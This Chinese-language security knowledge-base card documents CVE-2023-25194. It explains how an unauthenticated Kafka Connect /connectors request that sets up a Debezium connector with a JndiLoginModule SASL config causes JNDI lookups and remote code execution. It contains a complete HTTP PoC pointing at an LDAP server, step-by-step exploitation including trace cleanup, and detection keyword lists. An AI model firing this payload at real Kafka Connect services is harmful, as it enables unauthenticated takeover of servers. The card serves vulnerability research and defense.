---
id: web-java-component-kafka-connect-debezium-sasl-jaas-jndi
title: Kafka Connect /connectors 未授权创建 Debezium 连接器：database.history.producer.sasl.jaas.config 的 JndiLoginModule JNDI 注入（CVE-2023-25194）
type: scenario
domain: web
path: web/java/component
technique: kafka-connect-debezium-producer-sasl-jaas-jndi-injection
tags:
- java
- kafka
- kafka-connect
- debezium
- jndi
- ldap
- sasl
- jaas
- config-injection
- unauth
- rce
- cve-2023-25194
cve:
- CVE-2023-25194
affected_versions: 2.4.0 <= Apache Kafka <= 3.3.2
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V680
  verified_at: '2026-11-13T13:22:09+08:00'
  notes: 已对照原文全文与18张截图核对：affected_versions 原文显式标注 2.4.0<=Apache kafka<=3.3.2，逐字一致；POST /connectors 未授权创建 Debezium 连接器 PoC 与原文一致；调用链 WorkerSourceTask#execute→BaseSourceTask#start→MySqlConnectorTask#start→MySqlDatabaseSchema/HistorizedRelationalDatabaseSchema→KafkaDatabaseHistory#start→KafkaProducer→SaslChannelBuilder#configure→LoginManager→LoginContext→JndiLoginModule.attemptAuthentication:526 InitialContext.lookup 与图18调用栈逐帧一致；图17 lookup 参数 ldap://127.0.0.1:1389/9mapep 与正文 PoC xmzgie 不同，均属原文，卡内以 ... 省略。dedup 与 Druid 载体卡（/druid/indexer/v1/sampler+consumerProperties→KafkaConsumer，Druid 25.0.0）为同 CVE 同 sink、入口/载体/环境均不同，非同一条利用链，append_scenario 并列成立；dup-scan 无涉及 pair。未实测复现。
url: /docs/web/java/component/web-java-component-kafka-connect-debezium-sasl-jaas-jndi/
draft: false
kb_aliases:
- CVE-2023-25194
- Kafka Connect JNDI 注入
- Kafka Connect 未授权连接器创建
- database.history.producer.sasl.jaas.config
- Debezium MySQL Connector JNDI
- ConnectorsResource#createConnector
---

## 一句话结论

Kafka Connect 的 REST 接口 `/connectors` 在默认无认证配置下允许任何人创建连接器；把 connector 指定为 Debezium MySQL（`io.debezium.connector.mysql.MySqlConnector`），并在 `database.history.producer.sasl.jaas.config` 中写 JDK 自带的 `com.sun.security.auth.module.JndiLoginModule`，连接器 task 启动时 Debezium 用它构造 KafkaProducer，kafka-clients 反射实例化该 LoginModule，`JndiLoginModule.attemptAuthentication` 随即对 `user.provider.url` 执行 `InitialContext.lookup()`，触发 JNDI 注入并远程执行命令（CVE-2023-25194，Apache Kafka 2.4.0–3.3.2）。

## 原理

- **入口是默认无认证的 Kafka Connect REST**：REST 服务默认监听 8083，`POST /connectors` 的 JSON `config` 由 `ConnectorsResource#createConnector` 接收并创建 connector 及其 task。创建请求只在线程池里排入任务，真正执行连接器逻辑的是另一个 worker 线程，因此单步调试创建入口看不到 JNDI。
- **Debezium 把 `database.history.producer.*` 透传给 KafkaProducer**：Debezium MySQL 连接器构造 schema 时调用 `config.getDatabaseHistory()` 的 `start()`；`KafkaDatabaseHistory#start()` 中执行 `new KafkaProducer(this.producerConfig.asProperties())`，即以 `database.history.producer.*` 前缀（去掉前缀后）作为生产者配置创建客户端。攻击者因此能把 `sasl.jaas.config` 这类客户端 SASL 配置写进连接器 JSON。
- **kafka-clients 反射实例化任意 LoginModule**：KafkaProducer 构造链 `newSender` → `ClientUtils.createChannelBuilder` → `ChannelBuilders.clientChannelBuilder` → `configure(configs)` → `LoginManager.acquireLoginManager` → `LoginManager` 构造 → `login.login()` → `LoginContext.login()`，最终 `LoginContext#invoke` 用 `methods[mIndex].invoke(moduleStack[i].module, initArgs)` 先调用 LoginModule 的 `initialize`，再调用 `login()`。修复前 kafka-clients 不限制 `sasl.jaas.config` 里的类名，攻击者可指定 JDK 自带的 `JndiLoginModule`。
- **JndiLoginModule 就是 JNDI sink**：`JndiLoginModule.initialize` 从 `user.provider.url` 解析出 `USER_PROVIDER`；`login()` → `attemptAuthentication(false)` 执行 `new InitialContext().lookup(userProvider)`。LDAP/RMI 服务返回恶意 Reference 或序列化数据，即可触发远程类加载/反序列化，形成完整 RCE。
- **为什么这条链成立**：漏洞根因是 kafka-clients 对 LoginModule 白名单缺失；Debezium 连接器只是把攻击者可控的 producer 配置合法地送进 `new KafkaProducer` 的载体，Kafka Connect 的未授权 REST 则提供了远程写入连接器配置的入口，三者叠加为一条无需凭据的 RCE 链。
- **版本条件**：原文明确标注影响版本为 2.4.0 <= Apache Kafka <= 3.3.2。

## 触发条件

- 目标运行受影响版本的 Apache Kafka（原文环境为 kafka_2.11-2.4.0 归档包；影响区间 2.4.0–3.3.2），Kafka Connect REST 8083 从攻击者位置可达且未启用认证（默认无认证）。
- Connect worker 已安装 Debezium 插件，`GET /connector-plugins` 能看到 `io.debezium.connector.mysql.MySqlConnector`（原文 libs 中含 debezium-core-1.5.0.Final 等）。
- 目标能出网访问攻击者的 LDAP/HTTP 服务（或可使用本地 ObjectFactory gadget），JDK 版本允许对应 JNDI 利用路径（高版本需走本地工厂/反序列化绕过）。
- 连接器 `database.*` 字段需按原文填写可用的数据库配置，使 task 能走到初始化 stage/创建 history producer 的位置。

## 利用步骤

1. `GET /connector-plugins` 确认存在 `io.debezium.connector.mysql.MySqlConnector`。
2. 启动恶意 LDAP/HTTP 服务（如 JNDIExploit），准备返回执行命令的 Reference/序列化 payload。
3. 向 `POST /connectors` 提交连接器 JSON：`database.history.producer.security.protocol=SASL_SSL`、`database.history.producer.sasl.mechanism=PLAIN`，关键项 `database.history.producer.sasl.jaas.config` 写 `JndiLoginModule required user.provider.url="ldap://attacker:1389/..." ...`。
4. Connect 在 worker 线程启动 task：`WorkerSourceTask#execute` → `BaseSourceTask#start` → `MySqlConnectorTask#start` → `MySqlDatabaseSchema`/`HistorizedRelationalDatabaseSchema` 构造 → `KafkaDatabaseHistory#start` → `new KafkaProducer` → `SaslChannelBuilder#configure` → `LoginManager` → `LoginContext` → `JndiLoginModule` → `InitialContext.lookup(ldap://...)`。
5. LDAP 服务收到查询并返回恶意类/序列化数据，目标执行命令（原文弹出计算器验证）；随后可删除 connector 清理痕迹。

## PoC

```http
POST /connectors HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: application/json
Content-Length: <len>

{
    "name": "debezium-test-50174",
    "config": {
        "connector.class": "io.debezium.connector.mysql.MySqlConnector",
        "database.hostname": "127.0.0.1",
        "database.port": "3306",
        "database.user": "root",
        "database.password": "<db-password>",
        "database.server.id": "316545017",
        "database.server.name": "test1",
        "database.history.kafka.bootstrap.servers": "127.0.0.1:9092",
        "database.history.kafka.topic": "quickstart-events",
        "database.history.producer.security.protocol": "SASL_SSL",
        "database.history.producer.sasl.mechanism": "PLAIN",
        "database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://127.0.0.1:1389/xmzgie\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
}
```

调试时可在 `bin/kafka-run-class.sh` 开头加 `export KAFKA_DEBUG=2` 开启 5005 远程调试；原文截图确认 `JndiLoginModule.attemptAuthentication:526` 处 `InitialContext.lookup(417)` 的参数为 `ldap://127.0.0.1:1389/...`，调用栈自 `WorkerSourceTask#execute` 一路到 `BaseSourceTask#start`。

## 变体与关联

- **载体变体**：同一 sink 可由任何能控制 Kafka producer/consumer 配置的入口触发。Druid Kafka sampler 的 `consumerProperties` 载体见 [[web-java-deserialization-jndi-druid-kafka-sasl-jaas-jndi]]（同 CVE，入口与 PoC 不同）；其他数据集成/流处理平台把用户 JSON 透传给 `new KafkaProducer/Consumer` 时同理。Kafka Connect 中若 `producer.override.*` 被 override policy 限制，连接器自带的 producer 配置项（如 Debezium `database.history.producer.*`）是更直接的绕过面。
- **LoginModule 变体**：修复前 `sasl.jaas.config` 可实例化 classpath 上任意 LoginModule，除 JndiLoginModule 外其他带 JNDI/文件/网络副作用的模块也可作为 sink。
- **JNDI 高版本绕过**：LDAP 返回本地 ObjectFactory / 反序列化 gadget 的思路见 [[web-java-deserialization-jndi-high-version-beanfactory-el]]、[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]。
- **同组件其他问题**：[[web-java-component-kafka-client-oauthbearer-token-endpoint-url-file-read]]（CVE-2025-27817，Kafka 客户端配置注入读文件）、[[web-java-component-kafka-ui-groovy-script-filter-rce]]（Kafka UI Groovy RCE）。

## 检测与防御

- **升级**：将 Apache Kafka 升级到 3.4.0 及以上（受影响区间之外），修复版本限制了 connector 客户端配置中的 JNDI/LoginModule 滥用。
- **接口收敛**：Kafka Connect REST 不应暴露到不可信网络；启用认证（如 REST 扩展/反向代理 Basic Auth）、HTTPS 与来源白名单，禁止匿名 `POST /connectors`。
- **配置白名单**：对 connector 配置做校验，禁止 `sasl.jaas.config` 中出现 `JndiLoginModule`、`user.provider.url`、`group.provider.url`、`ldap://`、`rmi://` 等；同时审计 `*.producer.*`、`producer.override.*`、`consumer.override.*` 等透传属性。
- **运行环境**：限制 Connect worker 出站到非业务地址，最小权限运行；无业务需求时不安装 Debezium 等第三方 connector 插件。
- **检测**：审计 `POST /connectors` 请求体中的 `connector.class`、`sasl.jaas.config`、`JndiLoginModule`、`ldap://` 关键字；监控 Connect 日志中的 LoginManager/LoginException 异常，以及 worker 进程向 389/1389 等 LDAP 端口或未知主机的出站连接；告警重复创建同名 connector 的失败请求（`already exists`）。
